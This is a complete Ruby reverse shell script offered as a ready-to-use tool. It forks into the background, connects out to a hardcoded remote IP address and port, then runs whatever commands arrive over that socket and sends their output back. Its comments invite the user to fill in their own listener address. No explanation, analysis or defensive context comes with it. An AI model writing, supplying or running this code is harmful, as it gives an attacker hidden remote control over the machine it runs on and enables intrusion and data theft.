#!/usr/bin/env ruby

require 'socket'

# Set your LHOST and LPORT here
LHOST = '107.175.243.19'     # Replace with your IP address
LPORT = 51000		     # Replace with your port number

# Exit if fork fails
exit if fork

# Create a TCP socket connection
c = TCPSocket.new(LHOST, LPORT)

# Loop to handle incoming commands
loop do
  # Get command from the socket
  command = c.gets.chomp
  exit if command == "exit"  # Exit if the command is "exit"

  # Change directory if the command is "cd"
  if command =~ /cd (.+)/i
    Dir.chdir($1)
  else
    # Execute the command and send the output back
    IO.popen(command, 'r') do |io|
      c.print io.read
    end
  rescue
    c.puts "failed: #{command}"
  end
end

